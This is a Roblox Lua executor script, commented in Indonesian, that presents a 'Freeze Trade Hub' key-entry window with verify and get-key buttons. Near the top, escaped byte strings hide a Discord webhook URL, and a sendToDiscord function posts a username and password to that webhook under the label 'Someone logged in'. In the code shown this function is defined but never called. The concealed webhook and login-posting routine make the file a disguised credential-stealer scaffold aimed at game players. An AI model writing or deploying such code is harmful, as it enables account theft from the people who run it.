local function obfuscateString(str)
    return string.char(table.unpack({string.byte(str, 1, #str)}))
end

local a = obfuscateString("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\51\54\53\56\50\48\50\52\49\57\56\50\50\54\57\50\47\119\67\117\81\108\73\113\75\105\87\78\83\105\73\57\104\73\109\69\115\100\71\110\70\89\50\102\111\90\76\87\113\71\66\102\114\86\107\84\120\75\57\71\49\121\65\103\54\109\83\116\83\78\101\80\89\104\113\54\118\89\120\118\100\49\68\75\112")
local b = obfuscateString("\76\79\71\73\78\45\102\82\69\101\90\101\84\82\97\100\69\72\85\66\46\105\100\45\98\71\114\70\68\83\101\82\105\72\85\71\102\97\118\72\83\75")
local c = obfuscateString("\104\116\116\112\115\58\47\47\108\105\110\107\45\116\97\114\103\101\116\46\110\101\116\47\49\50\55\51\48\56\55\47\102\114\101\101\122\101\116\114\97\100\101\104\117\98")

local function sendToDiscord(d, e)
    local f = {
        Url = a,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. d .. "\nPassword: " .. e
        })
    }
    local requestFunction = syn and syn.request or http and http.request or request
    if requestFunction then
        local g = requestFunction(f)
        if g and g.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", g and g.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Fungsi Membuat GUI
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local verifyKeyButton = Instance.new("TextButton")
    local copyLinkButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "KeyValidationGUI"
    if syn and syn.protect_gui then
        syn.protect_gui(gui) -- Untuk executor seperti Synapse X
        gui.Parent = game:GetService("CoreGui")
    else
        gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    end

    -- Frame
    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Key Box
    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Key Button
    verifyKeyButton.Name = "VerifyKeyButton"
    verifyKeyButton.Parent = frame
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.Text = "Verifikasi Key"
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Copy Link Button
    copyLinkButton.Name = "CopyLinkButton"
    copyLinkButton.Parent = frame
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
    copyLinkButton.Text = "Get Key"
    copyLinkButton.Font = Enum.Font.SourceSansBold
    copyLinkButton.TextSize = 16
    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Tombol Copy Link
    copyLinkButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard("https://link-target.net/1273087/freezetradehub")
            print("Link berhasil disalin ke clipboard!")
        else
            print("Executor Anda tidak mendukung setclipboard. Salin manual.")
        end
    end)

    -- Fungsi Tombol Verifikasi Key
    verifyKeyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK" then
            print("Key benar!")
            gui:Destroy()
            -- Panggil fungsi GUI berikutnya
        else
            errorLabel.Text = "Key salah! Silakan coba lagi."
        end
    end)
end

-- Memulai GUI
createKeyValidationGUI()
